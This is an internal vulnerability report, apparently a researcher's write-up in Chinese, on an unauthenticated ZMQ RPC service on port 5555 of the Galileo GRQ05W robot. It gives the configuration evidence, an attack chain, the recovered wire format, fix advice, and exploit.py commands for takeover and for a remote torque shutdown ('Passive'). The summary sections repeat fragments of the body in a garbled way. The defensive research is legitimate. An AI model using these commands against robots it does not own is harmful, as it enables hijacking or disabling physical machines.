---
编号: GAL-012
验证状态: 静态确认
严重程度: 高
披露状态: 内部研究
源平台: 伽利略
源候选目录: ZMQ5555未授权RPC运动控制
---
# GAL-012 伽利略（Galileo）机器人 ZMQ 5555 未授权 RPC 运动控制 漏洞报告

## 1. 一句话结论

- # 伽利略（Galileo）机器人 ZMQ 5555 未授权 RPC 运动控制 漏洞报告
- \| 漏洞类型 \| 未授权远程 RPC → 运动控制通道发布（task group / policy / 速度指令） \|
- \| 权限 \| 任意可达 TCP 5555 的主机 → 运动控制（转发 LCM `mc_desired_group` / `mc_policy_desired` / `UserCommandData`） \|
- ## 1. 漏洞概述
- `mc_desired_group` / `mc_policy_desired`。即：**一个未认证 TCP 5555 连接即可向运动控制

## 2. 影响产品与版本

- \| 目标设备 \| 伽利略（Galileo）GRQ05W 轮足机器人（固件 galileo-inter 1.0.44） \|
- \| 漏洞组件 \| hermesmm 中间件 RPC 后端（`libhermesmmSdk.so`），monitor_manager 常驻加载 \|
- \| 授权边界 \| 仅对自有设备、隔离环境进行 \|
- 服务端，绑定 **tcp://*:5555**，其配置将**所有服务/方法名以通配 `(.*)` 开放注册**，且
- `"Error processing request: "`、`"Could not parse server response"` —— 标准 request/response 服务端；
- - 服务端注册名 `sdk_control_user_command`；

## 3. 验证状态

`静态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- `mc_desired_group` / `mc_policy_desired`。即：**一个未认证 TCP 5555 连接即可向运动控制
- │  ① zmq_connect tcp://<robot>:5555 （null 机制，无认证握手）
- libhermesmmSdk.so 全库 `auth` 零出现；实机已证 greeting/NULL 未认证连接被接受

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- # 伽利略（Galileo）机器人 ZMQ 5555 未授权 RPC 运动控制 漏洞报告
- \| 漏洞类型 \| 未授权远程 RPC → 运动控制通道发布（task group / policy / 速度指令） \|
- \| 权限 \| 任意可达 TCP 5555 的主机 → 运动控制（转发 LCM `mc_desired_group` / `mc_policy_desired` / `UserCommandData`） \|
- `lcm_types::UserCommandData` 等数据直接写入数据中心，进而转发到运动控制 LCM 通道
- `mc_desired_group` / `mc_policy_desired`。即：**一个未认证 TCP 5555 连接即可向运动控制
- ④ 运动控制消费 → 任务组切换(站立/趴下/rl_control)、策略切换、速度指令

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# 伽利略（Galileo）机器人 ZMQ 5555 未授权 RPC 运动控制 漏洞报告

| 项 | 值 |
|---|---|
| 目标设备 | 伽利略（Galileo）GRQ05W 轮足机器人（固件 galileo-inter 1.0.44） |
| 漏洞组件 | hermesmm 中间件 RPC 后端（`libhermesmmSdk.so`），monitor_manager 常驻加载 |
| 漏洞类型 | 未授权远程 RPC → 运动控制通道发布（task group / policy / 速度指令） |
| 监听 | `tcp://*:5555`（全接口） |
| 权限 | 任意可达 TCP 5555 的主机 → 运动控制（转发 LCM `mc_desired_group` / `mc_policy_desired` / `UserCommandData`） |
| 复现日期 | 2026-08-29（静态确认配置与符号；**wire 帧格式待动态确认**） |
| 授权边界 | 仅对自有设备、隔离环境进行 |

---

## 1. 漏洞概述

hermesmm（伽利略自研机器人中间件，SDK 侧 `libhermesmmSdk.so`）在本机开启一个 ZMQ RPC
服务端，绑定 **tcp://*:5555**，其配置将**所有服务/方法名以通配 `(.*)` 开放注册**，且
ZMQ 链路（null 机制）**无任何认证、加密或来源校验**。

消费端 `liborrt_monitor_manager_galileo_sdk_server_service.so` 把经该 RPC 收到的
`lcm_types::UserCommandData` 等数据直接写入数据中心，进而转发到运动控制 LCM 通道
`mc_desired_group` / `mc_policy_desired`。即：**一个未认证 TCP 5555 连接即可向运动控制
发布任务组/策略/速度指令，驱动机器人**。

## 2. 证据

### 2.1 配置（`galileo-robot-monitor/share/configuration/hermesmm/hermesmm.yaml`）

```yaml
rpc:
  backends:
    - type: zmq
      name: zmq_server
      options:
        zmq_address: "tcp://*:5555"          # ← 全接口绑定
        servers_options:
          - func_name: "(.*)"                # ← 任意函数名注册开放
            shm_enabled: false
channel:
  backends:
    - type: lcm
      options:
        lcm_address: "udpm://239.255.76.67"
        lcm_port: 15000
        lcm_ttl: 1
    pub_topics_options:  [{topic_name: "(.*)", enable_backends: [lcm-mc]}]
    sub_topics_options:  [{topic_name: "(.*)", enable_backends: [lcm-mc]}]
```

### 2.2 符号/字符串（libhermesmmSdk.so / liborrt_monitor_manager_galileo_sdk_server_service.so）

- RPC 框架：`CServiceServer`/`CServiceClient`、`RpcManager::RegisterServiceFunc/Invoke`、
  字符串 `"Invalid service or method name."`、`"Error: No server callback registered"`、
  `"Error processing request: "`、`"Could not parse server response"` —— 标准 request/response 服务端；
- 消费端符号 `GalileoSdkServerService::UserCommandMessage(hememm::STopicId, lcm_types::UserCommandData, long long, long long)`；
- 转发目标字符串（日志）：`[GalileoClientSdkControl] Robot channel: mc_desired_group action: {}`、
  `Robot control mode: {} to {}`、发布通道 `mc_desired_group` / `mc_policy_desired`；
- 服务端注册名 `sdk_control_user_command`；
- 全库未见 auth/token/handshake 类符号——ZMQ 为默认 null 安全机制（`zmq_bind` 直接绑定，无 CURVE/plain 配置串）。

## 3. 攻击链

```
攻击者（同网段，能连 TCP 5555）
   │  ① zmq_connect tcp://<robot>:5555 （null 机制，无认证握手）
   ▼
② 按 hermesmm RPC 帧格式调用 sdk_control_user_command 等服务
   ▼
③ GalileoSdkServerService 把数据写入数据中心 → 发布 LCM
     mc_desired_group / mc_policy_desired / UserCommandData
   ▼
④ 运动控制消费 → 任务组切换(站立/趴下/rl_control)、策略切换、速度指令
```

## 4. 影响范围

- 未授权远程运动控制（不依赖 LCM 组播配置、不需物理连接手柄）；
- 与 UDP 10086（接管）/ LCM 组播（速度）构成**三条独立未授权控制通道**，任一修复不影响其余。

## 5. 修复建议

1. ZMQ 启用 CURVE 加密 + 服务端公钥白名单（ZAP），或仅绑定 127.0.0.1；
2. RPC 服务端按白名单注册具体函数名，去掉 `(.*)` 通配；
3. 高权限控制命令（任务组/速度）要求带会话密钥签名的请求。

## 6. ★ wire 格式已还原（2026-08-29 round-2 + 我方指令级复核，原 Needs-Human 关闭）

```
ZMQ REQ 单文本帧:  "<seq>:<方法名>:<payload>"
  ZmqServerLoop@0x69d10: memchr ':'，前缀全数字作 seq
  RequestCallback@0x5cca4: 再按 ':' 分割得方法名 → 19 方法表任调

19 方法（我方字符串级固证）：
  SetRobotControlMode / GetRobotControlMode / SetRobotPolicy / GetRobotPolicyStatus
  StandUp / StandDown / Passive / RealtimeMotionControl / GetRobotMotionStatus
  GetChargePercentage / GetChargeState / GetRobotBatteryErrorCode / GetRobotSystemErrorCode
  GetGpsAltitude / GetGpsLatitude / GetGpsLongitude / GetGpsNumSatellites /
  GetGpsRmcSpeed / GetGpsRmcValid

控制门：current_control_mode == "GalileoClientSdkControl"（固件实测拼写 Client；
  round-2 报告写 Clinet 为笔误）。SetRobotControlMode 无校验直接写模式槽 → 门自服务。
  Passive = mc_desired_group "passive" = 力矩全关（未授权远程急停）
```

libhermesmmSdk.so 全库 `auth` 零出现；实机已证 greeting/NULL 未认证连接被接受
（`ff 00×8 01 7f`）。exploit.py 已升级为完整 ZMTP 3.0 NULL 握手 + RPC 调用。

## 7. 复现（adb 桥接版 exploit.py）

```bash
python exploit.py probe                            # greeting 探测（无副作用）
python exploit.py call GetRobotControlMode         # 只读方法回显
python exploit.py demo                             # 接管→查询→交还
python exploit.py takeover                         # SetRobotControlMode GalileoClientSdkControl
python exploit.py recover                          # 交还 GalileoJoystickControl
python exploit.py raw "1:Passive:passive"          # ⚠️ 力矩全关（远程急停）
```

## 8. 证据

- `evidence/wire格式还原与验证_20260829.md`：19 方法 + 冒号解析指令 + Client 拼写校准
- `evidence/hermesmm.yaml`、`evidence/strings_symbols.txt`：配置与符号
- `C:\zyh\work\机器人\伽利略\ext_audit\round2\round2-交叉静态验证_20260829.md` §二.1
